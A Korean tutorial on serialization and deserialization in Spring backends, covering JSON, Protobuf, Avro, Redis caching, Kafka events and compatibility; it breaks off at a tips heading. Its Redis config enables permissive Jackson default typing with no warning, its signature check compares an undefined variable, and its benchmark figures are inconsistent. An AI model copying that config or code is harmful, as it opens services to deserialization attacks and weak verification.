# 백엔드 개발자를 위한 직렬화 완벽 가이드

## 실무에서 바로 써먹는 직렬화/역직렬화 상세 정리 (예제 코드 포함)

---

웹 백엔드 개발에서 데이터는 "프로세스 메모리 안"에만 머무르지 않습니다. HTTP 요청/응답으로 전달되고, 캐시에 저장되며, 메시지 큐를 타고 다른 서비스로 흘러가고, 로그나 이벤트로 장기 보관됩니다. 이 과정의 중심에 있는 개념이 **직렬화(Serialization)** 와 **역직렬화(Deserialization)** 입니다.

이 글에서는 백엔드 실무 관점에서 직렬화/역직렬화를 체계적이고 상세하게 정리합니다. 특히 **직렬화 포맷(JSON/Protobuf/Avro 등)** 의 차이, 선택 기준, 스프링 기반 프로젝트에서의 주의점까지 구체적인 예제 코드와 함께 다룹니다.

---

## 목차

1. [직렬화와 역직렬화의 정의](#1-직렬화와-역직렬화의-정의)
2. [직렬화가 필요한 이유](#2-직렬화가-필요한-이유-메모리-vs-전송저장)
3. [실무에서 직렬화가 등장하는 지점](#3-실무에서-직렬화가-등장하는-지점)
4. [꼭 알아야 할 핵심 개념](#4-직렬화역직렬화에서-반드시-알아야-할-개념)
5. [직렬화 포맷 상세 비교](#5-직렬화-포맷-비교-백엔드-실무-관점)
6. [포맷 선택 가이드](#6-포맷-선택-기준-결정에-필요한-질문)
7. [역직렬화 문제와 해결책](#7-역직렬화에서-자주-터지는-문제와-방어-전략)
8. [Spring 실무 포인트](#8-스프링자바-기준-실무-포인트)
9. [체크리스트](#9-체크리스트-운영-품질을-위한-직렬화-설계)
10. [결론](#10-결론)

---

## 1. 직렬화와 역직렬화의 정의

### 1.1 직렬화(Serialization)

**메모리 내 객체/데이터 구조를 전송·저장 가능한 표현(바이트 또는 문자열)으로 변환**하는 과정입니다.

#### 예시 1: Java DTO 객체 → JSON 문자열

```java
public class UserDTO {
    private Long id;
    private String name;
    private String email;
    
    // 생성자, getter, setter 생략
}

// 직렬화 과정
UserDTO user = new UserDTO(1L, "홍길동", "hong@example.com");
ObjectMapper mapper = new ObjectMapper();
String json = mapper.writeValueAsString(user);

// 결과
// {"id":1,"name":"홍길동","email":"hong@example.com"}
```

#### 예시 2: 이벤트 객체 → Protobuf 바이너리

```java
// Protobuf 정의
message UserEvent {
    int64 user_id = 1;
    string action = 2;
    int64 timestamp = 3;
}

// 직렬화 과정
UserEvent event = UserEvent.newBuilder()
    .setUserId(123L)
    .setAction("LOGIN")
    .setTimestamp(System.currentTimeMillis())
    .build();

byte[] bytes = event.toByteArray();
// 결과: 바이너리 데이터 (약 15-20 bytes)
```

### 1.2 역직렬화(Deserialization)

**저장·전송된 표현을 다시 메모리 내 객체/구조로 복원**하는 과정입니다.

#### 예시 1: HTTP 요청 Body(JSON) → Request DTO

```java
@RestController
public class UserController {
    
    @PostMapping("/users")
    public UserDTO createUser(@RequestBody UserDTO userDTO) {
        // Spring이 자동으로 JSON → UserDTO 역직렬화 수행
        System.out.println("Name: " + userDTO.getName());
        return userService.create(userDTO);
    }
}

// 클라이언트가 보낸 JSON
// POST /users
// Content-Type: application/json
// {"name":"김철수","email":"kim@example.com"}

// 역직렬화 후
// UserDTO{id=null, name="김철수", email="kim@example.com"}
```

#### 예시 2: Kafka 메시지(Avro) → Consumer에서 이벤트 객체

```java
@KafkaListener(topics = "user-events")
public void handleUserEvent(UserEvent event) {
    // Kafka가 자동으로 Avro 바이너리 → UserEvent 객체로 역직렬화
    log.info("사용자 이벤트: userId={}, action={}", 
        event.getUserId(), event.getAction());
}
```

### 1.3 왜 백엔드에서 중요한가

직렬화는 단순 변환이 아닙니다. 다음을 좌우합니다.

#### API 계약(Contract)

필드/타입/버전이 곧 인터페이스입니다.

```java
// API v1
{
    "userId": 123,
    "userName": "홍길동"
}

// API v2에서 필드명 변경 시
{
    "id": 123,        // userId → id로 변경
    "name": "홍길동"   // userName → name으로 변경
}

// 문제: v1 클라이언트가 userId를 찾다가 실패 → 장애 발생!
```

#### 성능

payload 크기, 파싱 비용, GC 부하가 시스템 전체 성능을 좌우합니다.

```
JSON (텍스트 기반):
- 크기: 150 bytes
- 파싱 시간: 100ms
- 메모리: 10MB
- GC 부하: 높음

Protobuf (바이너리 기반):
- 크기: 30 bytes (80% 감소)
- 파싱 시간: 10ms (10배 빠름)
- 메모리: 2MB (80% 감소)
- GC 부하: 낮음
```

#### 안정성

호환성(Backward/Forward)이 장애를 방지합니다.

```java
// Backward Compatible: 새 버전이 옛 데이터를 읽을 수 있음
public class UserDTO {
    private Long id;
    private String name;
    private String email;  // 새로 추가된 필드 (null 허용)
}

// Forward Compatible: 옛 버전이 새 데이터를 읽을 수 있음
// Jackson 설정으로 알 수 없는 필드 무시
mapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
```

#### 보안

신뢰할 수 없는 입력 역직렬화는 취약점이 됩니다.

```java
// ❌ 위험한 역직렬화
@PostMapping("/admin")
public void handleAdminAction(@RequestBody Object data) {
    // 공격자가 악의적인 타입을 주입할 수 있음
}

// ✅ 안전한 역직렬화
@PostMapping("/admin")
public void handleAdminAction(@RequestBody @Valid AdminRequestDTO data) {
    // 명확한 DTO 타입으로 제한
    // @Valid로 추가 검증
}
```

---

## 2. 직렬화가 필요한 이유 (메모리 vs 전송/저장)

### 2.1 메모리 내 객체의 특성

프로세스 내부의 객체는 다음 요소를 포함합니다:

```java
public class User {
    private Long id;                    // 클래스/타입 정보
    private String name;
    private List<Order> orders;         // 참조(포인터) 구조
    
    // 런타임 상태
    private transient boolean isLoaded; // 초기화 상태
}

// 메모리 구조
// User 객체 주소: 0x7f3c4b001000
// - id: 123L
// - name: 문자열 객체 주소 → 0x7f3c4b002000
// - orders: List 객체 주소 → 0x7f3c4b003000
//     └─ Order[0] 주소 → 0x7f3c4b004000
//     └─ Order[1] 주소 → 0x7f3c4b005000
```

이런 메모리 구조는 **다른 프로세스나 시스템에서는 의미가 없습니다**.

### 2.2 네트워크와 디스크의 제약

네트워크나 디스크는 오직 **바이트 스트림(또는 텍스트)** 만 다룰 수 있습니다.

```java
// ❌ 불가능: 객체를 그대로 전송할 수 없음
Socket socket = new Socket("server.com", 8080);
User user = new User(123L, "홍길동");
socket.getOutputStream().write(user); // 컴파일 에러!

// ✅ 가능: 직렬화 후 바이트로 전송
String json = objectMapper.writeValueAsString(user);
socket.getOutputStream().write(json.getBytes(StandardCharsets.UTF_8));
```

### 2.3 직렬화 포맷의 역할

"어떤 규칙으로 표현할 것인가"가 **직렬화 포맷(format)** 입니다.

```
같은 User 객체를 다른 포맷으로 표현:

JSON (텍스트):
{"id":123,"name":"홍길동","email":"hong@example.com"}

Protobuf (바이너리):
[0x08, 0x7B, 0x12, 0x09, 0xED, 0x99, 0x8D, ...]

MessagePack (바이너리):
[0x83, 0xA2, 0x69, 0x64, 0xCC, 0x7B, 0xA4, ...]

XML (텍스트):
<user><id>123</id><name>홍길동</name>...</user>
```

포맷 선택은 팀의 비용 구조(개발/운영/디버깅)까지 영향을 미칩니다.

---

## 3. 실무에서 직렬화가 등장하는 지점

### 3.1 HTTP API

모든 REST API 통신에서 직렬화가 발생합니다.

#### Controller 입력: JSON → Request DTO

```java
@RestController
@RequestMapping("/api/orders")
public class OrderController {
    
    @PostMapping
    public ResponseEntity<OrderResponse> createOrder(
            @RequestBody @Valid OrderRequest request) {
        
        // 1. Spring이 JSON → OrderRequest 역직렬화
        // 2. @Valid로 검증
        // 3. 비즈니스 로직 처리
        Order order = orderService.createOrder(request);
        
        // 4. OrderResponse 생성
        OrderResponse response = OrderResponse.from(order);
        
        // 5. Spring이 OrderResponse → JSON 직렬화
        return ResponseEntity.ok(response);
    }
}

// 클라이언트 요청
// POST /api/orders
// Content-Type: application/json
// {
//   "productId": 123,
//   "quantity": 2,
//   "shippingAddress": "서울시 강남구..."
// }

// 서버 응답
// HTTP/1.1 200 OK
// Content-Type: application/json
// {
//   "orderId": 456,
//   "status": "PENDING",
//   "totalPrice": 50000,
//   "createdAt": "2026-02-03T10:30:00Z"
// }
```

#### 내부 동작 원리

```
1. 클라이언트가 HTTP 요청 전송
   POST /api/orders
   Content-Type: application/json
   Body: {"productId":123,"quantity":2}

2. Spring DispatcherServlet이 요청 수신

3. HttpMessageConverter가 Content-Type 확인
   → application/json
   → MappingJackson2HttpMessageConverter 선택

4. ObjectMapper가 JSON → OrderRequest 역직렬화
   {
     "productId": 123,
     "quantity": 2
   }
   →
   OrderRequest{
     productId: 123L,
     quantity: 2
   }

5. Bean Validation 수행 (@Valid)
   - @NotNull 검증
   - @Min, @Max 검증
   - Custom Validator 실행

6. Controller 메소드 실행

7. OrderResponse → JSON 직렬화
   OrderResponse{
     orderId: 456L,
     status: "PENDING",
     totalPrice: 50000
   }
   →
   {
     "orderId": 456,
     "status": "PENDING",
     "totalPrice": 50000
   }

8. HTTP 응답 전송
```

### 3.2 캐시/세션 (예: Redis)

캐시에 저장할 때 객체를 직렬화합니다.

#### Redis 캐시 설정

```java
@Configuration
@EnableCaching
public class RedisCacheConfig {
    
    @Bean
    public RedisCacheManager cacheManager(
            RedisConnectionFactory connectionFactory) {
        
        // JSON 직렬화 설정
        Jackson2JsonRedisSerializer<Object> serializer = 
            new Jackson2JsonRedisSerializer<>(Object.class);
        
        ObjectMapper mapper = new ObjectMapper();
        mapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        mapper.activateDefaultTyping(
            LaissezFaireSubTypeValidator.instance,
            ObjectMapper.DefaultTyping.NON_FINAL,
            JsonTypeInfo.As.PROPERTY
        );
        
        serializer.setObjectMapper(mapper);
        
        // Redis 캐시 설정
        RedisCacheConfiguration config = RedisCacheConfiguration
            .defaultCacheConfig()
            .serializeValuesWith(
                RedisSerializationContext.SerializationPair
                    .fromSerializer(serializer)
            )
            .entryTtl(Duration.ofHours(1));  // TTL 1시간
        
        return RedisCacheManager.builder(connectionFactory)
            .cacheDefaults(config)
            .build();
    }
}
```

#### 캐시 사용

```java
@Service
public class ProductService {
    
    @Autowired
    private ProductRepository productRepository;
    
    @Cacheable(value = "products", key = "#id")
    public ProductDTO findById(Long id) {
        // 1. Redis에서 "products::id" 키로 조회
        // 2. 캐시 히트: 역직렬화하여 반환
        // 3. 캐시 미스: DB 조회 후 직렬화하여 저장
        
        Product product = productRepository.findById(id)
            .orElseThrow(() -> new ProductNotFoundException(id));
        
        return ProductDTO.from(product);
    }
    
    @CacheEvict(value = "products", key = "#id")
    public void deleteProduct(Long id) {
        productRepository.deleteById(id);
        // 캐시에서 제거
    }
}
```

#### Redis에 실제 저장되는 형태

```
Redis CLI로 확인:
> GET products::1

{
  "@class": "com.example.dto.ProductDTO",
  "id": 1,
  "name": "노트북",
  "price": 1500000,
  "category": "전자제품",
  "createdAt": [2026, 2, 3, 10, 30, 0, 0],
  "stock": 50
}
```

### 3.3 메시지 큐/이벤트 스트리밍 (예: Kafka)

이벤트를 메시지로 전송하고 소비할 때 직렬화가 필요합니다.

#### Producer: 이벤트 객체 → 메시지

```java
@Service
public class OrderEventProducer {
    
    @Autowired
    private KafkaTemplate<String, OrderCreatedEvent> kafkaTemplate;
    
    public void publishOrderCreated(Order order) {
        // 이벤트 객체 생성
        OrderCreatedEvent event = OrderCreatedEvent.builder()
            .orderId(order.getId())
            .userId(order.getUserId())
            .productId(order.getProductId())
            .quantity(order.getQuantity())
            .totalPrice(order.getTotalPrice())
            .createdAt(order.getCreatedAt())
            .build();
        
        // Kafka로 전송 (자동으로 JSON 또는 Avro로 직렬화)
        kafkaTemplate.send("order-events", 
            order.getId().toString(),  // Key
            event);                     // Value
        
        log.info("주문 생성 이벤트 발행: orderId={}", order.getId());
    }
}
```

#### Consumer: 메시지 → 이벤트 객체

```java
@Service
public class OrderEventConsumer {
    
    @KafkaListener(topics = "order-events", groupId = "notification-service")
    public void handleOrderCreated(OrderCreatedEvent event) {
        // Kafka가 자동으로 메시지 → OrderCreatedEvent 객체로 역직렬화
        
        log.info("주문 생성 이벤트 수신: orderId={}, userId={}", 
            event.getOrderId(), event.getUserId());
        
        // 비즈니스 로직 처리
        notificationService.sendOrderConfirmation(
            event.getUserId(), 
            event.getOrderId()
        );
    }
    
    @KafkaListener(topics = "order-events", groupId = "analytics-service")
    public void handleOrderCreatedForAnalytics(OrderCreatedEvent event) {
        // 같은 이벤트를 다른 그룹에서 처리
        analyticsService.recordOrder(event);
    }
}
```

#### Kafka 메시지 형태 (JSON 직렬화)

```json
{
  "orderId": 123,
  "userId": 456,
  "productId": 789,
  "quantity": 2,
  "totalPrice": 50000,
  "createdAt": "2026-02-03T10:30:00Z"
}
```

### 3.4 저장 (파일/로그/DB 컬럼)

#### 이벤트 소싱

```java
@Entity
@Table(name = "event_store")
public class EventStore {
    
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @Column(nullable = false)
    private String aggregateId;      // 집합 ID (주문 ID, 사용자 ID 등)
    
    @Column(nullable = false)
    private String eventType;        // 이벤트 타입
    
    @Column(nullable = false, columnDefinition = "TEXT")
    private String eventData;        // JSON으로 직렬화된 이벤트
    
    @Column(nullable = false)
    private LocalDateTime occurredAt;
    
    private Long version;            // 이벤트 버전
}

// 이벤트 저장
@Service
public class EventStoreService {
    
    @Autowired
    private EventStoreRepository eventStoreRepository;
    
    @Autowired
    private ObjectMapper objectMapper;
    
    public void saveEvent(String aggregateId, DomainEvent event) throws JsonProcessingException {
        // 이벤트 직렬화
        String eventData = objectMapper.writeValueAsString(event);
        
        EventStore store = EventStore.builder()
            .aggregateId(aggregateId)
            .eventType(event.getClass().getSimpleName())
            .eventData(eventData)
            .occurredAt(LocalDateTime.now())
            .version(event.getVersion())
            .build();
        
        eventStoreRepository.save(store);
    }
    
    public List<DomainEvent> loadEvents(String aggregateId) throws JsonProcessingException {
        List<EventStore> stores = eventStoreRepository
            .findByAggregateIdOrderByOccurredAt(aggregateId);
        
        List<DomainEvent> events = new ArrayList<>();
        for (EventStore store : stores) {
            // 이벤트 타입에 따라 역직렬화
            Class<? extends DomainEvent> eventClass = 
                getEventClass(store.getEventType());
            
            DomainEvent event = objectMapper.readValue(
                store.getEventData(), 
                eventClass
            );
            
            events.add(event);
        }
        
        return events;
    }
}
```

#### DB JSON 컬럼 (PostgreSQL JSONB)

```java
@Entity
@Table(name = "products")
public class Product {
    
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @Column(nullable = false)
    private String name;
    
    @Column(nullable = false)
    private Integer price;
    
    // JSON 컬럼 (메타데이터 저장)
    @Type(type = "jsonb")
    @Column(columnDefinition = "jsonb")
    private ProductMetadata metadata;
}

// 메타데이터 클래스
public class ProductMetadata {
    private Map<String, String> attributes;  // 제품 속성
    private List<String> tags;                // 태그
    private Map<String, Object> customFields; // 커스텀 필드
    
    // getter, setter
}

// 사용 예시
Product product = new Product();
product.setName("노트북");
product.setPrice(1500000);

ProductMetadata metadata = new ProductMetadata();
metadata.setAttributes(Map.of(
    "brand", "Samsung",
    "model", "Galaxy Book",
    "cpu", "Intel i7",
    "ram", "16GB"
));
metadata.setTags(List.of("electronics", "laptop", "work"));

product.setMetadata(metadata);
productRepository.save(product);

// DB에 저장되는 형태
// id | name   | price   | metadata
// 1  | 노트북  | 1500000 | {"attributes":{"brand":"Samsung","model":"Galaxy Book",...},"tags":["electronics","laptop","work"],...}
```

---

## 4. 직렬화/역직렬화에서 반드시 알아야 할 개념

### 4.1 스키마(Schema) 유무

#### 스키마리스(느슨한 계약) - JSON

JSON은 데이터 자체에 구조 정보가 포함됩니다.

```json
{
  "id": 123,
  "name": "홍길동",
  "email": "hong@example.com",
  "age": 30,
  "active": true,
  "roles": ["USER", "ADMIN"]
}
```

**장점:**

1. 빠르게 시작 가능
```java
// 스키마 정의 없이 바로 사용
public class UserDTO {
    private Long id;
    private String name;
    private String email;
}
```

2. 사람이 읽기 쉬움
```bash
# 로그에서 바로 확인
curl http://localhost:8080/users/123 | jq .
```

3. 유연한 구조 변경
```java
// 필드 추가가 쉬움
public class UserDTO {
    private Long id;
    private String name;
    private String email;
    private String phone;  // 새 필드 추가
}
```

**단점:**

1. 타입 체크가 약함
```json
{
  "age": "30"  // 문자열인지 숫자인지 모호
}

// 역직렬화 시 런타임 에러 가능
Integer age = userDTO.getAge();  // String을 Integer로 파싱 실패
```

2. 크기가 큼
```json
// 필드명이 반복되어 크기 증가
[
  {"id": 1, "name": "A", "email": "a@example.com"},
  {"id": 2, "name": "B", "email": "b@example.com"},
  {"id": 3, "name": "C", "email": "c@example.com"}
]

// 총 크기: 약 150 bytes
```

3. 파싱 비용이 높음
```
JSON 파싱: 100ms
메모리 할당: 많음
GC 부하: 높음
```

#### 스키마 기반(강한 계약) - Protobuf, Avro

먼저 스키마를 정의하고, 코드를 생성합니다.

**Protobuf 예시:**

```protobuf
// user.proto
syntax = "proto3";

package com.example;

message User {
  int64 id = 1;
  string name = 2;
  string email = 3;
  int32 age = 4;
  bool active = 5;
  repeated string roles = 6;
}
```

```bash
# 코드 생성
protoc --java_out=src/main/java user.proto
```

```java
// 사용
User user = User.newBuilder()
    .setId(123L)
    .setName("홍길동")
    .setEmail("hong@example.com")
    .setAge(30)
    .setActive(true)
    .addRoles("USER")
    .addRoles("ADMIN")
    .build();

byte[] bytes = user.toByteArray();  // 바이너리 직렬화
```

**장점:**

1. 타입이 명확
```java
// 컴파일 타임에 타입 체크
User user = User.newBuilder()
    .setAge("30")  // 컴파일 에러! int만 허용
    .build();
```

2. 크기가 작음
```
JSON:     150 bytes
Protobuf: 30 bytes (80% 감소)
```

3. 빠름
```
Protobuf 파싱: 10ms (JSON 대비 10배 빠름)
메모리 할당: 적음
GC 부하: 낮음
```

4. 호환성 관리 용이
```protobuf
// v1
message User {
  int64 id = 1;
  string name = 2;
}

// v2 (Backward Compatible)
message User {
  int64 id = 1;
  string name = 2;
  string email = 3;  // 새 필드 추가 (옛 버전은 무시)
}
```

**단점:**

1. 스키마 파일 관리 필요
```
프로젝트 구조:
proto/
  ├── user.proto
  ├── order.proto
  └── product.proto

문제:
- .proto 파일 버전 관리
- 코드 생성 자동화
- 팀 간 스키마 공유
```

2. 사람이 읽을 수 없음
```bash
# Protobuf 바이너리
$ cat message.bin
??#홍길동hong@example.com...

# 디버깅 도구 필요
$ protoc --decode=User user.proto < message.bin
```

#### 실무 선택 기준

```
외부 공개 API (모바일, 웹 클라이언트)
  → JSON
  → 이유: 범용성, 디버깅 편의, 빠른 개발

내부 서비스 통신 (MSA)
  → Protobuf + gRPC
  → 이유: 성능, 타입 안전성, HTTP/2

이벤트 스트리밍 (Kafka)
  → Avro + Schema Registry
  → 이유: 스키마 진화 관리, 다수 컨슈머 지원
```

### 4.2 결정성(Determinism)

**정의:** 동일한 데이터를 직렬화했을 때 **항상 동일한 결과**가 나오는 성질

#### 결정성이 필요한 경우

**1. 서명(Signature) 생성**

```java
// 데이터 무결성 검증을 위한 서명
public String signData(OrderDTO order) throws JsonProcessingException {
    // 1. 직렬화
    String json = objectMapper.writeValueAsString(order);
    
    // 2. HMAC 서명
    String signature = hmacSha256(json, secretKey);
    
    return signature;
}

// 검증
public boolean verifySignature(OrderDTO order, String receivedSignature) 
        throws JsonProcessingException {
    
    String json = objectMapper.writeValueAsString(order);
    String calculatedSignature = hmacSha256(json, secretKey);
    
    return signature.equals(calculatedSignature);
}

// 문제: JSON이 비결정적이면 같은 데이터라도 다른 서명 생성
```

**JSON 비결정성 문제:**

```json
// 같은 데이터, 다른 순서
{"name": "홍길동", "age": 30}
{"age": 30, "name": "홍길동"}

// 같은 데이터, 다른 공백
{"name":"홍길동","age":30}
{"name": "홍길동", "age": 30}

// 모두 다른 서명 생성!
```

**해결책: Canonical JSON**

```java
@Configuration
public class JacksonConfig {
    
    @Bean
    public ObjectMapper canonicalObjectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        
        // 1. 필드 정렬
        mapper.configure(
            SerializationFeature.ORDER_MAP_ENTRIES_BY_KEYS, true
        );
        mapper.configure(
            MapperFeature.SORT_PROPERTIES_ALPHABETICALLY, true
        );
        
        // 2. 공백 제거
        mapper.configure(SerializationFeature.INDENT_OUTPUT, false);
        
        // 3. 숫자 형식 통일
        mapper.configure(
            JsonGenerator.Feature.WRITE_BIGDECIMAL_AS_PLAIN, true
        );
        
        return mapper;
    }
}

// 항상 동일한 결과
// {"age":30,"name":"홍길동"}
```

**2. 캐시 키 생성**

```java
public String getCacheKey(SearchCriteria criteria) 
        throws JsonProcessingException {
    
    // JSON으로 직렬화
    String json = canonicalObjectMapper.writeValueAsString(criteria);
    
    // MD5 해시로 캐시 키 생성
    String hash = DigestUtils.md5Hex(json);
    
    return "search:" + hash;
}

// 같은 검색 조건은 항상 같은 캐시 키
SearchCriteria criteria1 = new SearchCriteria("laptop", "electronics");
SearchCriteria criteria2 = new SearchCriteria("laptop", "electronics");

// cache_key_1 == cache_key_2
```

**3. 해시 기반 중복 제거**

```java
public boolean isDuplicate(Event event) throws JsonProcessingException {
    // 이벤트 직렬화
    String json = canonicalObjectMapper.writeValueAsString(event);
    
    // SHA-256 해시
    String hash = DigestUtils.sha256Hex(json);
    
    // 중복 체크
    if (eventHashRepository.existsByHash(hash)) {
        log.warn("중복 이벤트 감지: hash={}", hash);
        return true;
    }
    
    // 해시 저장
    eventHashRepository.save(new EventHash(hash, LocalDateTime.now()));
    
    return false;
}
```

### 4.3 호환성(Backward/Forward Compatibility)

호환성은 무중단 배포의 핵심입니다.

#### Backward Compatibility (하위 호환성)

**정의:** 새 버전의 코드가 옛 버전의 데이터를 읽을 수 있음

**시나리오:**

```
1. 서비스 v1 배포 중
   - 필드: id, name
   
2. Redis 캐시에 v1 데이터 저장됨

3. 서비스 v2 배포
   - 필드: id, name, email (추가)
   
4. v2가 Redis의 v1 데이터를 읽을 수 있어야 함
```

**안전한 변경:**

```java
// v1
public class UserDTO {
    private Long id;
    private String name;
}

// v2 (Backward Compatible ✓)
public class UserDTO {
    private Long id;
    private String name;
    private String email;  // null 허용
}

// v1 데이터 역직렬화
// {"id": 1, "name": "홍길동"}
// → UserDTO{id=1, name="홍길동", email=null}
// 정상 동작!
```

**위험한 변경:**

```java
// v2 (Backward Compatible ✗)
public class UserDTO {
    private Long id;
    private String fullName;  // name → fullName 변경
    private String email;
}

// v1 데이터 역직렬화
// {"id": 1, "name": "홍길동"}
// → UserDTO{id=1, fullName=null, email=null}
// name 필드를 찾을 수 없어 fullName이 null!
```

#### Forward Compatibility (상위 호환성)

**정의:** 옛 버전의 코드가 새 버전의 데이터를 어느 정도 읽을 수 있음

**시나리오:**

```
1. 서비스 v2 배포
   - 필드: id, name, email
   
2. v2가 email 포함된 데이터 전송

3. 일부 클라이언트는 아직 v1
   - 필드: id, name
   
4. v1 클라이언트가 v2 데이터를 읽을 수 있어야 함
```

**Jackson 설정:**

```java
@Configuration
public class JacksonConfig {
    
    @Bean
    public ObjectMapper objectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        
        // 알 수 없는 필드 무시 (Forward Compatible)
        mapper.disable(
            DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES
        );
        
        return mapper;
    }
}

// v1 클라이언트가 v2 데이터 수신
// {"id": 1, "name": "홍길동", "email": "hong@example.com"}

// v1 클라이언트 역직렬화
public class UserDTO {
    private Long id;
    private String name;
    // email 필드 없음
}

// → UserDTO{id=1, name="홍길동"}
// email 필드는 무시됨, 정상 동작!
```

#### 실전 예시: 필드 이름 안전하게 변경하기

```java
// Step 1: 새 필드 추가, 옛 필드 유지
public class UserDTO {
    
    @JsonProperty("userName")
    @Deprecated
    private String name;
    
    // Getter/Setter 통합
    public String getUserName() {
        return name;
    }
    
    public void setUserName(String name) {
        this.name = name;
    }
    
    public String getName() {
        return name;
    }
    
    public void setName(String name) {
        this.name = name;
    }
}

// JSON 직렬화 결과 (양쪽 모두 호환)
// {"userName": "홍길동", "name": "홍길동"}

// Step 2: 모든 클라이언트를 Step 1 버전으로 업그레이드
// (1~3개월 유예 기간)

// Step 3: 옛 필드 제거
public class UserDTO {
    private String name;
}
```

### 4.4 순환 참조/객체 그래프 문제

Entity에 양방향 관계가 있을 때 발생하는 문제입니다.

#### 문제 상황

```java
@Entity
public class User {
    @Id
    private Long id;
    
    private String name;
    
    @OneToMany(mappedBy = "user")
    private List<Order> orders;
}

@Entity
public class Order {
    @Id
    private Long id;
    
    private Integer totalPrice;
    
    @ManyToOne
    private User user;
}

// Controller에서 Entity 직접 반환
@GetMapping("/users/{id}")
public User getUser(@PathVariable Long id) {
    return userRepository.findById(id).orElseThrow();
}

// JSON 직렬화 시도
// User → orders → Order → user → orders → Order → user → ...
// 무한 루프!

// 에러:
// com.fasterxml.jackson.databind.JsonMappingException:
// Infinite recursion (StackOverflowError)
```

#### 잘못된 해결 방법

**1. @JsonIgnore 사용**

```java
@Entity
public class Order {
    @Id
    private Long id;
    
    @ManyToOne
    @JsonIgnore  // 한쪽만 무시
    private User user;
}

// 문제:
// 1. Order 조회 시 user 정보를 전혀 전달할 수 없음
// 2. API마다 다르게 노출하고 싶어도 불가능
// 3. Entity에 직렬화 로직이 섞임 (관심사 분리 위반)
```

**2. @JsonManagedReference / @JsonBackReference**

```java
@Entity
public class User {
    @OneToMany(mappedBy = "user")
    @JsonManagedReference
    private List<Order> orders;
}

@Entity
public class Order {
    @ManyToOne
    @JsonBackReference
    private User user;
}

// 문제:
// 1. 여전히 Entity에 직렬화 로직이 섞임
// 2. LAZY 로딩, N+1 문제 여전히 존재
// 3. API별로 다른 형태로 노출하고 싶을 때 불가능
```

#### 올바른 해결 방법: DTO 패턴

```java
// Response DTO
public class UserResponse {
    private Long id;
    private String name;
    private String email;
    private List<OrderSummary> recentOrders;
    
    public static UserResponse from(User user) {
        UserResponse response = new UserResponse();
        response.setId(user.getId());
        response.setName(user.getName());
        response.setEmail(user.getEmail());
        
        // 필요한 정보만 선택적으로 포함
        response.setRecentOrders(
            user.getOrders().stream()
                .sorted(Comparator.comparing(Order::getOrderedAt).reversed())
                .limit(3)  // 최근 3개만
                .map(OrderSummary::from)
                .collect(Collectors.toList())
        );
        
        return response;
    }
}

// 주문 요약 (순환 참조 없음)
public class OrderSummary {
    private Long id;
    private Integer totalPrice;
    private String status;
    private LocalDateTime orderedAt;
    
    public static OrderSummary from(Order order) {
        OrderSummary summary = new OrderSummary();
        summary.setId(order.getId());
        summary.setTotalPrice(order.getTotalPrice());
        summary.setStatus(order.getStatus().name());
        summary.setOrderedAt(order.getOrderedAt());
        return summary;
        // user 정보는 포함하지 않음 (이미 UserResponse에 있음)
    }
}

// Controller
@GetMapping("/users/{id}")
public UserResponse getUser(@PathVariable Long id) {
    // 필요한 데이터만 fetch join으로 조회
    User user = userRepository.findByIdWithRecentOrders(id)
        .orElseThrow(() -> new UserNotFoundException(id));
    
    return UserResponse.from(user);
}

// Repository
@Query("SELECT DISTINCT u FROM User u " +
       "LEFT JOIN FETCH u.orders o " +
       "WHERE u.id = :id " +
       "ORDER BY o.orderedAt DESC")
User findByIdWithRecentOrders(@Param("id") Long id);
```

**장점:**

1. 순환 참조 완전 방지
2. API마다 필요한 정보만 노출
3. Entity 변경이 API에 영향 없음
4. 명시적 쿼리 최적화 (N+1 방지)
5. 보안 (민감한 정보 선택적 노출)

---

## 5. 직렬화 포맷 비교 (백엔드 실무 관점)

### 5.1 JSON

**HTTP API의 표준에 가까운 선택**입니다.

#### 기본 구조

```json
{
  "id": 123,
  "name": "홍길동",
  "email": "hong@example.com",
  "age": 30,
  "active": true,
  "roles": ["USER", "ADMIN"],
  "address": {
    "city": "서울",
    "zipCode": "12345"
  },
  "metadata": null
}
```

#### 장점

**1. 언어/플랫폼 독립**

```java
// Java
ObjectMapper mapper = new ObjectMapper();
String json = mapper.writeValueAsString(user);
User user = mapper.readValue(json, User.class);
```

```python
# Python
import json
json_str = json.dumps(user_dict)
user_dict = json.loads(json_str)
```

```javascript
// JavaScript
const json = JSON.stringify(user);
const user = JSON.parse(json);
```

**2. 디버깅, 로그 확인이 용이**

```bash
# curl로 직접 테스트
curl -X POST http://localhost:8080/users \
  -H "Content-Type: application/json" \
  -d '{"name":"홍길동","email":"hong@example.com"}'

# jq로 JSON 파싱
echo '{"name":"홍길동","age":30}' | jq '.name'
# 출력: "홍길동"

# 로그에서 바로 확인
2026-02-03 10:30:00 [INFO] Request: {"userId":123,"action":"login"}
```

**3. 생태계 성숙**

- Postman, Insomnia 등 API 테스트 도구
- JSON Schema 검증
- 모든 언어에서 라이브러리 제공

#### 단점

**1. 텍스트 기반이라 payload가 크고 파싱 비용이 높음**

```
크기 비교:
JSON:     {"id":123,"name":"홍길동","email":"hong@example.com"} (54 bytes)
Protobuf: [0x08, 0x7B, 0x12, 0x09, ...] (약 25 bytes, 54% 감소)

성능 비교:
JSON 파싱: 100ms, 메모리 10MB, GC 압박 높음
Protobuf: 10ms, 메모리 2MB, GC 압박 낮음
```

**2. 날짜/정밀도/바이너리 표현이 애매**

```json
// 날짜 표현 (비표준)
{"createdAt": "2026-02-03T10:30:00Z"}        // ISO-8601
{"createdAt": 1738582200000}                  // Epoch millis
{"createdAt": "2026-02-03 10:30:00"}          // 커스텀

// 숫자 정밀도 문제
{"price": 12345.67}  // double (정밀도 손실 가능)
{"largeNumber": 9007199254740993}  // JavaScript에서 정확히 표현 불가

// 바이너리 표현
{"image": "iVBORw0KGgoAAAANSUhEUgAA..."}  // Base64 (33% 크기 증가)
```

**3. 스키마가 느슨해 계약 붕괴를 컴파일 타임에 잡기 어려움**

```java
// JSON에서는 이런 실수를 컴파일 타임에 잡을 수 없음
{
  "age": "30"  // 문자열 vs 숫자 모호
}

// 런타임에 에러 발생
Integer age = userDTO.getAge();  // NumberFormatException
```

#### 실무 팁

